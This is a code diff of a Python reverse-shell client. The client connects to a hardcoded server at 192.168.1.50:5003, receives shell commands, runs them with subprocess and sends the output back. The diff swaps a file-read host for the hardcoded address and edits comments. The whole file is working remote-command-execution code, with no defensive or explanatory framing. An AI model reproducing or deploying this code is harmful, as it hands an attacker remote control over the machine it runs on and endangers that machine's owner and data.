@@ -3,9 +3,7 @@ import os
 import subprocess
 import sys
 
-with open('myip') as f:
-    SERVER_HOST = f.readlines()
-
+SERVER_HOST = "192.168.1.50"
 SERVER_PORT = 5003
 BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
 # separator string for sending 2 messages in one go
@@ -13,14 +11,14 @@ SEPARATOR = "<sep>"
 
 # create the socket object
 s = socket.socket()
-# connect to the server
+# connect to the server.py
 s.connect((SERVER_HOST, SERVER_PORT))
 # get the current directory
 cwd = os.getcwd()
 s.send(cwd.encode())
 
 while True:
-    # receive the command from the server
+    # receive the command from the server.py
     command = s.recv(BUFFER_SIZE).decode()
     splited_command = command.split()
     if command.lower() == "exit":
@@ -41,7 +39,7 @@ while True:
         output = subprocess.getoutput(command)
     # get the current working directory as output
     cwd = os.getcwd()
-    # send the results back to the server
+    # send the results back to the server.py
     message = f"{output}{SEPARATOR}{cwd}"
     s.send(message.encode())
 # close client connection
